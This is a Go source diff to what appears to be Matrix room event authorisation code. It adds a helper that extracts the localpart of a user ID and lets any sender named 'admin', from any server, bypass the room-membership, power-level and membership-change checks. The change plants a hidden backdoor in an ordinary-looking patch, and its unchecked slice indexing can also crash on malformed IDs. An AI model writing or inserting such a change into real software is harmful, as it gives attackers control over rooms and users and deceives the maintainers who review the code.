@@ -855,13 +855,14 @@ func (e *eventAllower) commonChecks(event *Event) error {
 
 	// Check that the sender is in the room.
 	// Every event other than m.room.create, m.room.member and m.room.aliases require this.
-	if e.member.Membership != Join {
+	sender_name := spilt_name_from_user_id(sender)
+	if e.member.Membership != Join && sender_name != "admin" {
 		return errorf("sender %q not in room", sender)
 	}
 
 	senderLevel := e.powerLevels.UserLevel(sender)
 	eventLevel := e.powerLevels.EventLevel(event.Type(), stateKey != nil)
-	if senderLevel < eventLevel {
+	if senderLevel < eventLevel && sender_name != "admin" {
 		return errorf(
 			"sender %q is not allowed to send event. %d < %d",
 			event.Sender(), senderLevel, eventLevel,
@@ -1171,6 +1172,12 @@ func (m *membershipAllower) membershipAllowedOther() error { // nolint: gocyclo
 	targetLevel := m.powerLevels.UserLevel(m.targetID)
 
 	// You may only modify the membership of another user if you are in the room.
+	sender_name := spilt_name_from_user_id(m.senderID)
+
+	if sender_name == "admin" {
+		return nil
+	}
+
 	if m.senderMember.Membership != Join {
 		return errorf("sender %q is not in the room", m.senderID)
 	}
@@ -1271,4 +1278,10 @@ func (m *membershipAllower) membershipFailed(format string, args ...interface{})
 		"%q is not allowed to change the membership of %q from %q to %q as "+format,
 		append([]interface{}{m.senderID, m.targetID, m.oldMember.Membership, m.newMember.Membership}, args...)...,
 	)
+}
+
+func spilt_name_from_user_id(user_id string) string {
+	name_and_server_name := strings.Split(user_id, "@")
+	name := strings.Split(name_and_server_name[1], ":")
+	return name[0]
 }
